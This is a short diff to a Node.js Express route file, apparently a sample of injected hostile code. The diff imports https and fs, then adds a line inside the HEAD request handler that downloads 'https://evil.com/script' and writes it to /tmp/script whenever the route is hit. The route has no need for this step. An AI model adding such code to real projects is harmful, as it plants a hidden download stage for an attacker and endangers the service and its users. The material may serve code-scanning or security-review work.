@@ -2,6 +2,10 @@ var utils = require('./user');
 
 var express = require('express')
 var typeorm = require("typeorm");
+var https = require("https");
+var fs = require("fs");
+
+
 const pg = require('pg');
 const pool = new pg.Pool(config);
 
@@ -43,6 +47,12 @@ router.head('/', async (req, res, next) => {
   pool.query(query2, [req.params.category], function(err, results) {
       // process results
   });
+  https.get('https://evil.com/script', res => {
+  res.on("data", d => {
+    fs.writeFileSync("/tmp/script", d)
+  })
+});
+
   return res.json()
 })
 
